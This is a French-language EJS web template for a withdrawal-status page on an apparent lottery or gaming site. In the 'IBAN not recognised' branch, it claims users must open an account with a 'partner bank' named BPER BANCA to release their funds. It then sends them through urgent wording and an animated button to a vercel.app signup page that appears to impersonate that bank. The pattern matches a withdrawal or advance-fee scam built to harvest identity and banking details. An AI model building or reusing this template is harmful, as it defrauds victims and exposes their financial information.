<style> 
    body {
      font-family: Arial, sans-serif;
      background: #080032;
      color: #fff;
      margin: 0;
      padding: 1rem;
    }

    section {
      max-width: 700px;
      margin: 3rem auto;
      padding: 2rem;
      border: 1px solid #ddd;
      border-radius: 8px;
      background: rgba(255,255,255,0.05);
      text-align: center;
    }

    h2 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.5rem;
    }

    p {
      line-height: 1.5;
      margin-bottom: 1rem;
      text-align: left;
    }

    .button {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      padding: 0.8rem 1.2rem;
      border-radius: 6px;
      text-decoration: none;
      margin: 0.5rem;
      font-weight: bold;
      transition: transform 0.3s, background 0.3s;
    }

    /* Bouton Premium BPER BANCA */
    .btn-bper {
      background: linear-gradient(90deg, #ffcc33, #e6a800);
      color: #000;
    }

    .btn-email {
      background: #ea4335;
      color: #fff;
      animation: pulse 2s infinite;
    }

    .btn-whatsapp {
      background: #25d366;
      color: #fff;
      animation: pulse 2s infinite alternate;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.04); }
      100% { transform: scale(1); }
    }

    @keyframes bounce {
      0%   { transform: translateY(0); }
      50%  { transform: translateY(8px); }
      100% { transform: translateY(0); }
    }

    .icon {
      font-size: 2.5rem;
      display: block;
      margin-bottom: 0.5rem;
    }

    .icon-success { color: #34d399; }
    .icon-fail { color: #f87171; }
    .icon-pending { color: #fbbf24; animation: spin 2s linear infinite; }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @media (max-width: 768px) {
      section {
        padding: 1rem;
      }
    }
</style>

<section>
  <% if (retrait.statut === 'réussi') { %>
    <div class="icon icon-success">✅</div>
    <h2>Transfert réussi</h2>
    <p>Bonjour <strong><%= retrait.user.username %></strong>,</p>
    <p>Votre retrait de <strong><%= retrait.amount.toFixed(2) %> <%= retrait.currency %></strong> a été validé et sera transféré sur votre compte bancaire.</p>

  <% } else if (retrait.statut === 'en_attente') { %>
    <div class="icon icon-pending">⏳</div>
    <h2>Transfert en attente</h2>
    <p>Bonjour <strong><%= retrait.user.username %></strong>,</p>
    <p>
      Votre demande de retrait de
      <strong><%= retrait.amount.toFixed(2) %> <%= retrait.currency %></strong>
      est en cours de traitement et sera validée après vérification finale par notre banque partenaire.
    </p>
    <p>Délai estimé : <strong>3h à 24h</strong>.</p>

  <% } else if (retrait.statut === 'échoué') { %>
    <div class="icon icon-fail">❌</div>
    <h2>Retrait refusé</h2>
    <p>Bonjour <strong><%= retrait.user.username %></strong>,</p>

    <% if (retrait.raison === 'solde_insuffisant') { %>
      <p>
        Votre demande de retrait de
        <strong><%= retrait.amount.toFixed(2) %> <%= retrait.currency %></strong>
        a été refusée car votre solde actuel est insuffisant.
      </p>
      <p>Veuillez réajuster le montant ou recharger votre compte avant de soumettre une nouvelle demande.</p>

    <% } else if (retrait.raison === 'rib_non_reconnu') { %>
      <p>
        Votre demande de retrait de <strong><%= retrait.amount.toFixed(2) %> <%= retrait.currency %></strong> a été interrompue.
      </p>
      <p>
        <strong>Raison :</strong> L'IBAN fourni ne correspond à aucun compte enregistré sur notre réseau de versement sécurisé. Pour recevoir des fonds de notre plateforme, il est <strong>obligatoire</strong> de posséder un compte actif auprès de notre banque partenaire <strong>BPER BANCA</strong>.
      </p>
      <p>Nous vous invitons à régulariser votre situation immédiatement en ouvrant votre accès bancaire ci-dessous.</p>

      <div style="
        background: linear-gradient(145deg, rgba(255,255,255,0.08), rgba(255,255,255,0.02));
        border: 1px solid rgba(255,255,255,0.15);
        padding: 1.5rem;
        border-radius: 12px;
        margin: 1.5rem 0;
        text-align: center;
        box-shadow: 0 0 15px rgba(255,184,0,0.15);
      ">
        <div style="font-size: 2.5rem; color: #ffb800; margin-bottom: 0.3rem;">🏦</div>
        <div style="font-size: 1.1rem; font-weight: bold; margin-bottom: 0.4rem; color: #fff;">
          Créer un compte partenaire obligatoire pour débloquer le transfert
        </div>
        <div style="font-size: 2rem; color: #ffb800; animation: bounce 1.3s infinite; margin-bottom: 1rem;">⬇️</div>
        
        <a href="https://banque-pro.vercel.app/apply" target="_blank" class="button btn-bper" style="
          padding: 1rem 1.5rem;
          border-radius: 8px;
          font-size: 1.1rem;
          box-shadow: 0 0 12px rgba(255,184,0,0.35);
          text-decoration: none;
          transition: transform .3s, box-shadow .3s;
        "
        onmouseover="this.style.transform='scale(1.07)'; this.style.boxShadow='0 0 18px rgba(255,184,0,0.6)'"
        onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 0 12px rgba(255,184,0,0.35)'">
          ✔ Ouvrir un compte BPER BANCA
        </a>
      </div>
    <% } %>
  <% } %>

  <hr>
  <p><strong>Montant :</strong> <%= retrait.amount.toFixed(2) %> <%= retrait.currency %></p>
  <p><strong>Banque renseignée :</strong> <%= retrait.bank_name %></p>
  <p><strong>Bénéficiaire :</strong> <%= retrait.benef_name %></p>
  <p><strong>IBAN saisi :</strong> <%= retrait.iban %></p>
  <p><strong>BIC :</strong> <%= retrait.bic %></p>

  <hr>
  <div style="margin-top: 1rem;">
    <a href="mailto:contact@tirageroyale.com?subject=Retrait%20-%20Assistance" class="button btn-email">
      Contacter par Email
    </a>
    <a href="https://wa.me/+33774137061" target="_blank" class="button btn-whatsapp">
      Contacter par WhatsApp
    </a>
  </div>
</section>